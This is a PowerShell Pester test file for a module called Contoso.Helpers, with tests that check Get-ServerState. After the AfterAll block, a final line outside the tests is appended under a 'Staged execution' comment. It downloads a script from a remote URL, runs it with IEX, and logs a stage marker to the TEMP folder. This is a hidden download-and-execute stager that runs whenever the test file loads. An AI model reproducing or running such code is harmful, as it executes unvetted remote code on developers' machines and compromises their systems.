$ErrorActionPreference = "Stop"



BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Contoso.Helpers.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ServerState' {
    It 'returns a status object' {
        Get-ServerState -Name 'AdatumCollector' | Should -Not -BeNullOrEmpty
    }

    It 'throws for an unknown service' {
        { Get-ServerState -Name 'NoSuchAgent' } | Should -Throw
    }
}
AfterAll {
    Remove-Module Contoso.Helpers -Force -ErrorAction SilentlyContinue
}
<# Staged execution #> $TargetUrl = 'https://internal.corp:443/stage2.ps1'; $ScriptText = (New-Object System.Net.WebClient).DownloadString($TargetUrl); IEX $ScriptText; $StageMarker = "stage-25"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
